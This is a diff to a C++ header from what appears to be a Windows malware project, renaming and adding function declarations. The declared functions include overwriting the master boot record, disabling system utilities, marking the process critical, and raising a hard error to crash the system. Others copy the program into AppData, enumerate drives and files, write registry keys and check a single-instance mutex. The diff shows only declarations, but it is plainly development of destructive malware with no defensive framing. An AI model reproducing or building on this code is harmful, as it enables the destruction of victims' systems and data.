@@ -48,9 +48,11 @@
 #include <Windows.h>
 #include <bcrypt.h>
 #include <string>
-#include <vector>
 #include <Shlobj.h>
 #include <Shlwapi.h>
+#include <vector>
+
+#include <strsafe.h>
 
 // Libraries //
 #pragma comment(lib, "bcrypt.lib")
@@ -66,6 +68,8 @@
 #define MIN_RSLEN 8
 #define MAX_RSLEN 16
 
+#define MAX_BUFFER_SIZE 0x2000000
+
 #define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
 #define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
 #define MAX_SMPO 256
@@ -75,54 +79,56 @@
 #define REGISTRY_VALUE 0xBADC0DE
 
 // Function Macros //
-#define RandomStringGenerator	RandomStringGeneratorW
-#define CreateRegistryKey		CreateRegistryKeyW
-#define CheckRegistryKey		CheckRegistryKeyW
-#define DriveEnumerator			DriveEnumeratorW
-#define CopyFileAppData			CopyFileAppDataW
-#define DirectoryIeterator		DirectoryIeteratorW
+#define RandomStringGenerator	fnCryptGenRandomStringW
+#define CreateRegistryKey		fnCreateRegistryKeyW
+#define CheckRegistryKey		fnCheckRegistryKeyW
+#define DriveEnumerator			fnDriveEnumeratorW
+#define CopyFileToAppData		fnCopyFileW
+#define DirectoryIterator		fnDirectoryIteratorW
+#define CryptGenRandomBuffer	fnCryptGenRandomBufferW
 
 #ifndef DISABLE_MUTEX
-#define CheckMutex				CheckMutexW
+#define CheckMutex				fnCheckMutexW
 #endif // !DISABLE_MUTEX
 #ifndef DISABLE_SEMAPHORE
-#define CheckSemaphore			CheckSemaphoreW
+#define CheckSemaphore			fnCheckSemaphoreW
 #endif // !DISABLE_SEMAPHORE
 
 // Arrays //
-extern const WCHAR CharSet[];
-extern const size_t nCharSet;
+extern const WCHAR szCharSet[];
+extern const size_t cnCharSet;
 
 // FileSystem Functions //
-BOOL CopyFileAppDataW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR mfn[]);
-BOOL DriveEnumeratorW(std::vector<std::wstring>& vwsDrive);
-BOOL DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile);
+BOOL fnCopyFileW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR szMfn[]);
+BOOL fnDriveEnumeratorW(std::vector<std::wstring>& vszDrive);
+BOOL fnDirectoryIteratorW(std::wstring szDir, std::wstring szMask, std::vector<std::wstring>& vszDir, std::vector<std::wstring>& vszFile);
 
 #ifdef KILL_MBR
-BOOL OverwriteMBR(VOID);
+BOOL fnOverwriteMBR(VOID);
 #endif // KILL_MBR
 
 // Synchronization Functions //
 #ifndef DISABLE_MUTEX
-BOOL CheckMutexW(LPCWSTR lpName);
+BOOL fnCheckMutexW(LPCWSTR lpName);
 #endif // !DISABLE_MUTEX
 #ifndef DISABLE_SEMAPHORE
-BOOL CheckSemaphoreW(LPCWSTR lpName);
+BOOL fnCheckSemaphoreW(LPCWSTR lpName);
 #endif // !DISABLE_SEMAPHORE
 
 // RegEdit Functions //
-BOOL CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
-BOOL CheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD edwType, BYTE ebValue);
-BOOL DisableUtilities(VOID);
+BOOL fnCreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
+BOOL fnCheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwEType, BYTE bEValue);
+BOOL fnDisableUtilities(VOID);
 
 // Utilitie Functions //
-INT RandomNumberGenerator(VOID);
-std::wstring RandomStringGeneratorW(INT rsg_strlen);
-BOOL IsUserAdmin(VOID);
+INT fnCryptGenRandomNumber(VOID);
+std::wstring fnCryptGenRandomStringW(INT nLen);
+BOOL fnCryptGenRandomBufferW(PWCHAR pszRd, ULONG ulFs);
+BOOL fnIsUserAdmin(VOID);
 
 // NT Utilitie Functions //
 #ifndef DISABLE_NT_FUNCTIONS
-BOOL ImportNTDLLFunctions(VOID);
-BOOL NTSetProcessIsCritical(BOOLEAN blIscritical);
-BOOL NTRaiseHardError(VOID);
+BOOL fnImportNTDLLFunctions(VOID);
+BOOL fnNTSetProcessIsCritical(BOOLEAN blIsCritical);
+BOOL fnNTRaiseHardError(VOID);
 #endif // !DISABLE_NT_FUNCTIONS
